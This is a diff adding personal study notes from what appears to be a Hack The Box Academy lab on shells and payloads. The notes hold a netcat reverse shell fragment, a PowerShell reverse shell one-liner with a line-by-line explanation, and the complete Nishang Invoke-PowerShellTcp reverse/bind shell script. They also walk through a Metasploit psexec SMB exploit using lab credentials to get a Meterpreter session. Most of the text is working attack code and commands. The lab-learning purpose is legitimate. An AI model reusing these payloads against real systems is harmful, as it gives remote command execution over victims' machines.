@@ -115,6 +115,7 @@ Specifies the cmd language interpreter using the -i option to ensure the shell i
 $nc 10.10.14.12 7777 > /tmp/f 
 -Uses Netcat to send a conn to atk host port, the output will be redirected (>) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner cmd is executed
 \\PowerShell One-Liner Explained
+
 $powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 \\Calling PowerShell
 PS> powershell -nop -c 
@@ -124,3 +125,179 @@ PS> powershell -nop -c
 -Set/eval the variable $client equal to (=) the Net-Object cmdlet, which creates an instance of the System.Net.Sockets.TCPClient .NET framework object. The .NET framework object will conn with the TCP socket listed in the parentheses (10.10.14.158,443) the semi-colon(;) ensure the cmd & code are executed sequently
 \\Setting the command stream
 $stream = $client.GetStream();
+Set/evaluates the var $stream equal to (=) $client var and the .NET fram method called Get Stream that faciliate network comm, the semi-colon(;) ensures the cmd & code are executed sequentially
+\\Empty Byte Stream
+[byte[]]$byte = 0..65535|%{0};
+-Create a byte type array([]) called $bytes that returns 65,535 zeros as the values in the array. this is essentially an empty byte stream that will be directed to the TCP listener on an atk box await for conn
+\\Stream Parameters
+$while(($i = $stream.Read($byte, 0, $bytes.Length)) -ne 0)
+-Start a while loop containing the $i var set equal to (=) the .Net fram Stream.Read($stream.Read) method
+the parameters: buffer ($bytes), offset (0), and count ($bytes.Length) are defined inside the parenthesses of the method
+\\Set The Bytes encoding
+{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)};
+set/eva the var $data (=) an ASCII encoding .NET frame class that will be used in conjunc GetString method to encode the byte stream ($bytes) into ASCII
+\\Invoke-Expression
+$sendback = (iex $data 2>&1 | Out-String );
+-Set/eva the var $senback (=) invoke-expression (iex) cmdlet the $data var, 
+then redirects the standard error (2>)& standard output through a pipe (|) to the Out-String cmdlet which coverts input object into strings
+\\Show Working directory
+$sendback2 = $sendback + 'PS ' + (pwd).path + '> ';
+-Set/eva the var $sendback2 (=) the $sendback var (+) the string PS('PS') + path to the working dir ((pwd).path) + the string '> ' 
+>> this will result in the shell prompt being PS C:\workingdirectoryofmachine >.
+\\Sets sendbyte
+$sendbyte=  ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}
+$sendbyte = ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat Listener 
+\\Tarminate TCP connection
+$client.Close()"      >> TCP close method will be used when the conn is terminated
+Script/ps1
+function Invoke-PowerShellTcp 
+{ 
+<#
+.SYNOPSIS
+Nishang script which can be used for Reverse or Bind interactive PowerShell from a target. 
+.DESCRIPTION
+This script is able to connect to a standard Netcat listening on a port when using the -Reverse switch. 
+Also, a standard Netcat can connect to this script Bind to a specific port.
+The script is derived from Powerfun written by Ben Turner & Dave Hardy
+.PARAMETER IPAddress
+The IP address to connect to when using the -Reverse switch.
+.PARAMETER Port
+The port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
+Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on 
+the given IP and port. 
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Bind -Port 4444
+Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port. 
+.EXAMPLE
+PS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
+Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must be
+listening on the given IP and port. 
+.LINK
+http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html
+https://github.com/nettitude/powershell/blob/master/powerfun.ps1
+https://github.com/samratashok/nishang
+#>      
+    [CmdletBinding(DefaultParameterSetName="reverse")] Param(
+
+        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
+        [String]
+        $IPAddress,
+
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
+        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
+        [Int]
+        $Port,
+
+        [Parameter(ParameterSetName="reverse")]
+        [Switch]
+        $Reverse,
+
+        [Parameter(ParameterSetName="bind")]
+        [Switch]
+        $Bind
+
+    )
+
+    
+    try 
+    {
+        #Connect back if the reverse switch is used.
+        if ($Reverse)
+        {
+            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
+        }
+
+        #Bind to the provided port if Bind switch is used.
+        if ($Bind)
+        {
+            $listener = [System.Net.Sockets.TcpListener]$Port
+            $listener.start()    
+            $client = $listener.AcceptTcpClient()
+        } 
+
+        $stream = $client.GetStream()
+        [byte[]]$bytes = 0..65535|%{0}
+
+        #Send back current username and computername
+        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        #Show an interactive PowerShell prompt
+        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
+        $stream.Write($sendbytes,0,$sendbytes.Length)
+
+        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+        {
+            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
+            $data = $EncodedText.GetString($bytes,0, $i)
+            try
+            {
+                #Execute the command on the target.
+                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
+            }
+            catch
+            {
+                Write-Warning "Something went wrong with execution of command on the target." 
+                Write-Error $_
+            }
+            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
+            $x = ($error[0] | Out-String)
+            $error.clear()
+            $sendback2 = $sendback2 + $x
+
+            #Return the results
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
+            $stream.Write($sendbyte,0,$sendbyte.Length)
+            $stream.Flush()  
+        }
+        $client.Close()
+        if ($listener)
+        {
+            $listener.Stop()
+        }
+    }
+    catch
+    {
+        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
+        Write-Error $_
+    }
+}
+\\Automating Payloads & Delivery with Metasploit
+-framework dev by Rapid 7 that stream line the process of exploiting vul through the use of prebuild module
+-understand what we are doing or it will ruin all the process.
+\\Praticing with Metasploit
+$sudo msfconsole
+\\NMAP scan
+$nmap -sC -sV -Pn 10.129.164.25
+>> it will show some vul that can be exploit using MSF
+\\Searching Within Metasploit
+msf>search smb
+56 exploit/windows/smb/psexec  = no + exploit module in MSF + target platform + service + define the tool that will get uploaded to the target system if it is vul
+$msf>use 56   >> msf6 exploit(Windows/smb/psexec)>
+\\Examining an Exploit options
+$msf> options
+-notice how this particular exploit will use a reverse TCP shell conn utilizing Meterpreter. A meterpreter shell give us far more func than a raw TCP reverse shell,
+\\Setting options
+$msf>set RHOSTS 10.129.180.71
+$msf>set SHARE ADMIN$
+$msf>set SMBPass HTB_@cademy_stdnt!
+$msf>set SMBUser htb-student
+$msf>set LHOST 10.10.14.222
+-these settings will ensure that our payload is delivered to the proper target (RHOSTS), uploaded to the default administrative share (ADMIN$)
+utilizing cred (SMBPass & SMBUser) then initiate a reverse shell conn with our local host machine (LHOST)
+-these settings will be specific to the IP addr on atk box. aws with ced. we can set the LHOST (local host) VPN tunnel IP addr or the VPN tunnel interface Ideals
+\\Explits Away  
+$msf> exploit
+-sign of sucessful when the session established a Meterpreter shell session (meterpreter >) and system-level shell session
+-Meterpreter is a payload that uses in-memory DLL injetion to steathfully establish a comm channel betw an atk box and target
+-the proper cred and atk vector can give ability upload & download files, exe cmd, run keylogger, create/start/stop services, manage processes ,...
+https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/
+\\Interactive Shell
+meterpreter>shell
+10.129.201.160 
+<test> Exploit the target using what you've learned in this section, then submit the name of the file
+ located in htb-student's Documents folder. (Format: filename.extension)
+
